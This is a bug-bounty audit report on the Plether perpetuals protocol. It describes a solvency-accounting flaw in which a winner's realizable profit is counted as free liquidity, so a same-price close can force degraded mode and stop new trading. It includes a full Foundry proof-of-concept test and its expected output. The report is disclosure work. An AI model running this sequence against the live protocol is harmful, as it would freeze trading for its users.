# \#97825 [SC-Medium] Open-entry solvency accounting treats realizable winner PnL as free liquidity, allowing a same-price close to halt new trading

**Submitted on Nov 3rd 2026 at 13:04:55 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97825
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

Plether's risk-increasing entry check counts all pool cash that has not yet become a finalized claim, including marked profit an existing winning position can realize immediately. A new position can consume that apparent headroom even though the same cash already backs the winner. The winner can then close without any further price movement, leaving effective assets below maximum liability. This automatically latches degraded mode and makes every subsequent open or increase revert until the pool is recapitalized and the owner clears the mode.

## Vulnerability Details

### The admission gate omits an immediately payable liability

The buffered-entry invariant requires every risk-increasing open to leave:

```text
E_after >= L_after + B
```

Here, `E` is effective pool assets, `L` is the larger directional endpoint liability, and `B` is the configured settlement buffer. `_applyOpenSettlementBufferAfterPlan` constructs the pre-open state from physical cash, finalized trader claims, and the two endpoint liabilities:

```solidity
SolvencyAccountingLib.SolvencyState memory currentState = SolvencyAccountingLib.buildSolvencyState(
    snap.poolCashAssets,
    SolvencyAccountingLib.getMaxLiability(snap.longSide.maxProfitAssets, snap.shortSide.maxProfitAssets),
    snap.totalTraderClaimBalanceAssets
);
// ...
satisfied = SolvencyAccountingLib.hasRequiredSettlementBuffer(
    result.effectiveAssetsAfterAssets, result.maxLiabilityAfterAssets, snap.settlementBufferBps
);
```

The liability terms passed to this check are endpoint payouts fixed when positions enter. For the LONG side, `maxProfitAssets` is the aggregate entry cost, corresponding to its payout at basket price zero. For the SHORT side, it is `lots * CAP_PRICE - entryCost`, corresponding to its payout at the cap. `getMaxLiability` then keeps only the larger side.

That is a terminal-price netting bound: it assumes both directional books are evaluated at one common final price. It does not cover asynchronous settlement, where one side first realizes a marked gain at the current price while the opposite side remains open and can still reach its own maximum-payout endpoint.

This creates the ordering gap:

- An open winner's marked profit remains inside `poolCashAssets` because it does not become a recorded claim until the winner closes.
- The endpoint-based `maxLiability` does not separately reserve that presently withdrawable gain.
- Once the winner settles, real cash leaves immediately, but the remaining side's endpoint liability stays live.

The same pool cash is therefore counted once as current effective assets and relied on again to back the remaining endpoint liability. Plether already measures the omitted obligation: `terminalNavSnapshot().terminalLpPriceDeltaAssets` is negative before the unsafe open, proving that the LP side owes net marked PnL. The admission calculation never consults it.

### Release-parameter reproduction

The PoC reaches the failure through the following ordinary production operations:

1. Starting pool cash is exactly 1,000,000 USDG. A 400,000-token LONG and 600,000-token SHORT are opened at 1.00, respecting the release 40% skew limit.
2. A permissionless Pyth update moves the authenticated basket mark by only 5%, to 1.05. The existing SHORT is now a winner with roughly 30,000 USDG of realizable marked profit.
3. A third account opens a 560,000-token LONG at 1.05. The entry gate accepts it, reporting `E = 1,000,694.300615` and `L = 988,000`. With the 25-bps buffer, the apparent admission headroom is only 10,224.30 USDG, materially less than the existing winner can withdraw.
4. The winning SHORT closes at the unchanged 1.05 mark. This is not a new adverse price event; it merely realizes the profit that was already present when step 3 passed.
5. Effective assets fall to `975,309.173066` while maximum liability remains `988,000`, producing a real `12,690.826934` USDG backing deficit.
6. `_enterDegradedModeIfInsolvent` detects `E < L` and latches degraded mode. The PoC then proves that a fresh trader's normal `commitOrder` reverts with `OrderRouter__DegradedMode`.

The second test repeats the same accounting transition after a larger mark move and measures a `185,857.680052` USDG deficit, demonstrating that the shortfall scales with the previously unreserved winner PnL.

This report does not claim that `E` literally adds unrealized trader losses: `E` is physical pool cash minus recorded claims. The specification correctly says unrealized losses are not spendable. The missing counterpart is a reservation for positive marked PnL that a winner can settle before the other side. As a result, the combined `E` and `L` admission test misses a valid winner-first settlement ordering.

Degraded mode is documented as containment when a later transition reveals insufficient backing, for example after a new adverse price move. That does not explain this sequence. The 5% price move occurs first, the engine remains outside degraded mode, and it then affirmatively admits additional risk. The already-profitable trader subsequently closes at the identical mark and immediately reveals `E < L`. The latch correctly contains the deficit after it exists, but it does not cure the upstream admission failure that allowed the deficit to be created.

## Impact Details

The selected in-scope impact is **Smart contract unable to operate due to lack of token funds**.

The PoC proves the selected operational impact directly. Once the legitimate winner is paid, the pool lacks enough token backing for the liability that the immediately preceding open was allowed to create. Plether responds by entering degraded mode. The test then submits a fresh user's ordinary opening `commitOrder`, reaches the global degraded-mode guard, and observes the exact `OrderRouter__DegradedMode` revert.

This state is not self-clearing. `clearDegradedMode` is owner-only and refuses to clear while `E < L`, so normal risk-increasing trading cannot resume until the backing deficit is removed, for example through recapitalization or reduction of the over-admitted liability.

The demonstrated token-funding shortfall is `12,690.826934` USDG in the release-parameter case: effective assets are that far below the still-live maximum liability. The claimed impact stops at the measured deficit and degraded-mode trading halt. It does not depend on a later endpoint move, an actually failed payout, direct theft, or a claim of protocol insolvency. No privileged access is needed to create the condition. All orders and mark updates in the PoC use public protocol entry points, and every risk parameter is taken from the release configuration in `DEPLOYMENT.md`.

The profitable SHORT and the new LONG can be controlled by the same actor through separate accounts. After an ordinary market move creates the marked gain, that actor can submit the opposite open and then close the winner at the same authenticated price. The sequence requires position margin and normal execution fees, but no privileged role, victim mistake, mocked protocol state, or transaction-ordering assumption. It can also occur organically when an unrelated trader opens opposite exposure while existing winners are in profit.

## Recommendation

Make risk-increasing admission reserve marked gains that open winners can realize at the current authenticated price. One approach is to deduct aggregate positive marked price PnL from effective assets in `_applyOpenSettlementBufferAfterPlan`, without offsetting that reserve by losers' unrealized losses. Add invariant coverage that evaluates every permitted winner-first settlement ordering after a candidate open.

## References

- [`CfdEnginePlanLib._applyOpenSettlementBufferAfterPlan`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L698-L779), admission check at [L755-L772](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L755-L772)
- [`SolvencyAccountingLib.getMaxLiability`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/SolvencyAccountingLib.sol#L64-L69) and [`buildSolvencyState`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/SolvencyAccountingLib.sol#L133-L148)
- [`CfdEngine._enterDegradedModeIfInsolvent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1368) and owner-only [`clearDegradedMode`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667)
- [Commit-time degraded-mode rejection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L327-L329)
- [`SECURITY.md` buffered entry solvency invariant](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L339)
- [`ACCOUNTING_SPEC.md` liability terms](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L84-L88) and [admission rule](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L238-L252)
- [`DEPLOYMENT.md` release parameters](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L125-L156)

## Proof of Concept

## Proof of Concept

This is an end-to-end protocol test of the stated impact. Each trade is committed by its trader through the production V3 `OrderRouter.commitOrder(OrderRequest)` path and permissionlessly executed through `OrderRouter.executeOrder`. The basket mark changes only through the public `OrderRouter.updateMarkPrice` Pyth path. No protocol state is written artificially and no vulnerable Plether contract is mocked. The fixture mocks only the external price provider and test settlement token. `LegacyOrderRouterHarness` inherits the production router unchanged; its added legacy test entry point is not called here.

The test retains Plether's release execution fee, 25-bps settlement buffer, `CAP_PRICE`, and 60-second execution window, while `_riskParams()` supplies the release values documented in `packages/perps/DEPLOYMENT.md`. The first case proves the complete impact chain at a 5% mark move: flawed admission, same-price winner withdrawal, measured asset deficit, degraded-mode latch, and rejection of a fresh user's open. The second case proves that the deficit scales.

Save the following file as `packages/perps/test/perps/accounting/cash-priority/MarkedWinnerAdmissionShortfall.t.sol` in the frozen repository:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {ProtocolLensViewTypes} from "@plether/perps/interfaces/ProtocolLensViewTypes.sol";

/// @dev Reproduces the accounting failure entirely through public V3 order and mark-update entry points.
///      The fixture substitutes only the external Pyth feed and settlement token.
contract MarkedWinnerAdmissionShortfallPoC is BasePerpTest {

    address internal constant PROFITABLE_SHORT = address(0xA11CE);
    address internal constant NEW_LONG = address(0xB0B);
    address internal constant INITIAL_LONG = address(0xC0FFEE);

    /// @dev Release risk parameters from packages/perps/DEPLOYMENT.md. Execution fee (4 bps), settlement buffer
    ///      (25 bps), CAP_PRICE (2.00) and the 60-second execution window are the unchanged constructor defaults.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 998_000e6;
    }

    /// @notice A 5% basket move on a two-sided book is enough. The new opposite open is admitted against cash the
    ///         existing winner can withdraw at once; the winner's close at the same price latches degraded mode.
    function test_SameMarkWinnerExitCreatesDeficitAndStopsNewOpens() public {
        assertEq(pool.totalAssets(), 1_000_000e6, "exact candidate pool cash");
        _fundTrader(INITIAL_LONG, 50_000e6);
        _fundTrader(PROFITABLE_SHORT, 50_000e6);
        _fundTrader(NEW_LONG, 50_000e6);

        _executeTrade(INITIAL_LONG, CfdTypes.Side.LONG, 400_000e18, 40_000e6, false, 1e8);
        _executeTrade(PROFITABLE_SHORT, CfdTypes.Side.SHORT, 600_000e18, 20_000e6, false, 1e8);

        _publishMark(1.05e8);
        assertLt(
            engine.terminalNavSnapshot().terminalLpPriceDeltaAssets, 0, "the book owes traders a net marked gain"
        );

        _executeTrade(NEW_LONG, CfdTypes.Side.LONG, 560_000e18, 20_000e6, false, 1.05e8);
        assertFalse(engine.degradedMode(), "admission accepts the new opposite exposure");
        ProtocolLensViewTypes.ProtocolAccountingSnapshot memory admitted =
            engineProtocolLens.getProtocolAccountingSnapshot();
        assertGt(
            admitted.effectiveSolvencyAssets,
            admitted.maxLiabilityAssets,
            "admission reports positive solvency headroom"
        );
        emit log_named_decimal_uint("after open: effective assets E", admitted.effectiveSolvencyAssets, 6);
        emit log_named_decimal_uint("after open: max liability L", admitted.maxLiabilityAssets, 6);

        uint256 markAtAdmission = engine.lastMarkPrice();
        assertEq(markAtAdmission, 1.05e8, "candidate open executes at the authenticated mark");

        // The winner realizes an existing gain; the mark is unchanged across the critical transition.
        _executeTrade(PROFITABLE_SHORT, CfdTypes.Side.SHORT, 600_000e18, 0, true, 1.05e8);
        assertEq(engine.lastMarkPrice(), markAtAdmission, "no later price move creates the shortfall");

        ProtocolLensViewTypes.ProtocolAccountingSnapshot memory accounting =
            engineProtocolLens.getProtocolAccountingSnapshot();
        assertTrue(engine.degradedMode(), "the winner's legitimate same-price close latches degraded mode");
        assertLt(
            accounting.effectiveSolvencyAssets,
            accounting.maxLiabilityAssets,
            "remaining cash no longer backs the admitted endpoint liability"
        );
        emit log_named_decimal_uint("after winner close: E", accounting.effectiveSolvencyAssets, 6);
        uint256 deficit = accounting.maxLiabilityAssets - accounting.effectiveSolvencyAssets;
        assertGt(deficit, 12_000e6, "the backing shortage is material");
        emit log_named_decimal_uint("deficit L - E (USDG)", deficit, 6);

        _assertNewOpenRejected();
    }

    /// @notice Larger move: the shortfall scales with the winner's marked gain.
    function test_DeficitScalesWithUnreservedWinnerProfit() public {
        assertEq(pool.totalAssets(), 1_000_000e6, "exact candidate pool cash");
        _fundTrader(PROFITABLE_SHORT, 25_000e6);
        _fundTrader(NEW_LONG, 25_000e6);

        _executeTrade(PROFITABLE_SHORT, CfdTypes.Side.SHORT, 400_000e18, 20_000e6, false, 1e8);

        _publishMark(1.5e8);
        assertLt(
            engine.terminalNavSnapshot().terminalLpPriceDeltaAssets,
            0,
            "the first trader must have an authenticated marked gain"
        );

        _executeTrade(NEW_LONG, CfdTypes.Side.LONG, 660_000e18, 20_000e6, false, 1.5e8);
        assertFalse(engine.degradedMode(), "the flawed admission path accepts the second open");

        _executeTrade(PROFITABLE_SHORT, CfdTypes.Side.SHORT, 400_000e18, 0, true, 1.5e8);

        ProtocolLensViewTypes.ProtocolAccountingSnapshot memory accounting =
            engineProtocolLens.getProtocolAccountingSnapshot();
        assertTrue(engine.degradedMode(), "paying the existing winner reveals insolvency");
        assertLt(
            accounting.effectiveSolvencyAssets,
            accounting.maxLiabilityAssets,
            "remaining cash no longer backs the admitted opposite endpoint liability"
        );
        assertGt(
            accounting.maxLiabilityAssets - accounting.effectiveSolvencyAssets,
            180_000e6,
            "the deficit is material"
        );
        emit log_named_decimal_uint(
            "deficit L - E (USDG)", accounting.maxLiabilityAssets - accounting.effectiveSolvencyAssets, 6
        );
    }

    /// @dev Any further open is refused at commitment until the owner recapitalizes and clears degraded mode.
    function _assertNewOpenRejected() internal {
        address newcomer = address(0xD00D);
        _fundTrader(newcomer, 50_000e6);
        OrderV3Types.OrderRequest memory request = _buildRequest(CfdTypes.Side.SHORT, 10_000e18, 5_000e6, false);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__DegradedMode.selector);
        vm.prank(newcomer);
        router.commitOrder(request);
    }

    function _executeTrade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint64 orderId = _commitOrder(account, side, size, margin, isClose);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _mockPythUpdateData(price));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _commitOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = _buildRequest(side, size, margin, isClose);
        orderId = router.nextCommitId();
        vm.prank(account);
        router.commitOrder(request);
    }

    function _buildRequest(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _publishMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        bytes[] memory updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
        router.updateMarkPrice(updateData);
        assertEq(engine.lastMarkPrice(), price, "public Pyth refresh installs the new mark");
    }

}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/accounting/cash-priority/MarkedWinnerAdmissionShortfall.t.sol -vv
```

Expected output:

```text
Ran 2 tests for test/perps/accounting/cash-priority/MarkedWinnerAdmissionShortfall.t.sol:MarkedWinnerAdmissionShortfallPoC
[PASS] test_DeficitScalesWithUnreservedWinnerProfit() (gas: 6713069)
Logs:
  deficit L - E (USDG): 185857.680052

[PASS] test_SameMarkWinnerExitCreatesDeficitAndStopsNewOpens() (gas: 8822885)
Logs:
  after open: effective assets E: 1000694.300615
  after open: max liability L: 988000.000000
  after winner close: E: 975309.173066
  deficit L - E (USDG): 12690.826934

Suite result: ok. 2 passed; 0 failed; 0 skipped
```
